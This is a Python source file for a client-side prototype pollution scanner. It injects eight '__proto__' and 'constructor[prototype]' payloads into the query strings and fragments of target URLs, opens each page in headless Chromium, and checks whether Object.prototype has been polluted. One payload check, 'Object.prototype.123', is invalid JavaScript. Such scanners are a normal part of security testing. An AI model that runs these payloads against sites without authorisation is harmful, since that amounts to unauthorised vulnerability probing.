# Implemented from: blog.s1r1us.ninja/research/PP
import time
import json
from argparse import ArgumentParser
from httplib import HTTPRequestSender
from playwright.sync_api import sync_playwright
from urllib.parse import urlparse, urlunparse





def read_lines(path):
    with open(path, "r") as file:
        data = [ l.strip() for l in file.readlines()]
    return data

def parse_arguments():
    parser = ArgumentParser()
    target_options = parser.add_argument_group("Target Options")
    #target_options.add_argument("-r","--request", dest="request", metavar="", help="Set a request for the application")
    target_options.add_argument("-u","--url", dest="url", metavar="", help="Set URL for the request")
    target_options.add_argument("-ul","--url-list", dest="url_list", metavar="", help="Set URL list for parsing")
    #target_options.add_argument("-rl","--request-list", dest="request_list", metavar="", help="Set request list for parsing")

    request_options = parser.add_argument_group("HTTP Request Options")
    request_options.add_argument("-H", "--header", dest="headers", metavar="", action="extend", nargs="+", help="Append headers to the request")
    request_options.add_argument("-x", "--proxy", dest="proxy", metavar="", help="Set Proxy protocol://address:port")
    
    browser_options = parser.add_argument_group("Browser Options")
    browser_options.add_argument("--show", dest="show_browser", action="store_true", help="Show Browser UI")
    

    return parser.parse_args()


def build_url(url,payload,separator):
    parsed_url = urlparse(url)
    query_params = []
    fragment_params = []
    if separator == "?":
        if parsed_url.query:
            query_params = parsed_url.query.split("&")
        query_params.append(payload)
        parsed_url = parsed_url._replace(query='&'.join(query_params))
    else:
        if parsed_url.fragment:
            fragment_params = parsed_url.fragment.split("&")
        fragment_params.append(payload)
        parsed_url = parsed_url._replace(fragment='&'.join(fragment_params))
    return urlunparse(parsed_url)




def check_urls(url_list, payloads, proxy, headers, headless):
    separators = ["?","#"]

    for url in url_list:
        for sep in separators:
            for name,payload,id,checker in payloads:
                """
                if sep == "?":
                    if "?" in url:
                        if "#" in url:
                            first,second = url.split("#",1)
                            final_url = f"{first}&{payload}#{second}"
                        else:
                            final_url = f"{url}&{payload}"
                    else:
                        final_url = f"{url}{sep}{payload}"
                else:
                    if "#" in url:
                        final_url = f"{url}&{payload}"
                    else:
                        final_url = f"{url}{sep}{payload}"
                """
                final_url = build_url(url,payload,sep)
              
                with sync_playwright() as p:
                    try:
                        if proxy:
                            browser = p.chromium.launch(proxy={"server": proxy }, headless=headless)
                        else:
                            browser = p.chromium.launch(headless=headless) 
                        context = browser.new_context(ignore_https_errors=True)
                        page = context.new_page()
                        page.set_extra_http_headers(headers)
                        page.goto(final_url)
                        if "#" in final_url:
                            page.evaluate(f"window.location.hash = '{payload}'")
                            new_url = page.evaluate("window.location.href")
                            page.reload()
                        result_exec = page.evaluate(checker)
                        if result_exec:
                            result_json = page.evaluate("JSON.stringify(Object.prototype)")
                            result_json = json.loads(result_json)
                            if id in result_json.keys() and result_json[id] == id:
                                print(f"[+] Prototype Pollution found on URL: {final_url}")
                        
                        browser.close()
                    except:
                        pass

def main():
    args = parse_arguments()

    payloads = [ 
        ('Prototype Pollution #1',  'x[__proto__][abaeead]=abaeead',            'abaeead',  '(typeof(Object.prototype.abaeead)!="undefined")'),
        ('Prototype Pollution #2',  'x.__proto__.edcbcab=edcbcab',              'edcbcab',  '(typeof(Object.prototype.edcbcab)!="undefined")'),
        ('Prototype Pollution #3',  '__proto__[eedffcb]=eedffcb',               'eedffcb',  '(typeof(Object.prototype.eedffcb)!="undefined")'),
        ('Prototype Pollution #4',  '__proto__.baaebfc=baaebfc',                'baaebfc',  '(typeof(Object.prototype.baaebfc)!="undefined")'),
        ('Prototype Pollution #5',  '__proto__=&0[bffcfff]=bffcfff',            'bffcfff',  '(typeof(Object.prototype.bffcfff)!="undefined")'),
        ('Prototype Pollution #6',  'constructor[prototype][afabbdd]=afabbdd',  'afabbdd',  '(typeof(Object.prototype.afabbdd)!="undefined")'),
        ('Prototype Pollution #7',  'constructor.prototype.cfbacfd=cfbacfd',    'cfbacfd',  '(typeof(Object.prototype.cfbacfd)!="undefined")'),
        ('Prototype Pollution #8',  '__proto__[123]=efebaed',                   '123',      '(typeof(Object.prototype.123)!="undefined")')
    ]
    request_sender = HTTPRequestSender()
    url_scanning = False
    request_scanning = False
    proxy = None
    headers = {}
    headless = True

    if args.url:
        url_list = [args.url.strip()]
        url_scanning = True
    if args.url_list:
        url_list = read_lines(args.url_list)
        url_scanning = True

    if args.headers:
        headers = {header.split(':',1)[0].strip():header.split(":",1)[1].strip() for header in args.headers if ":" in header}
    
    if args.proxy:
        proxy = args.proxy

    if args.show_browser:
        headless = False



    if url_scanning:
        check_urls(url_list, payloads, proxy, headers, headless)











if __name__ == '__main__':
    main()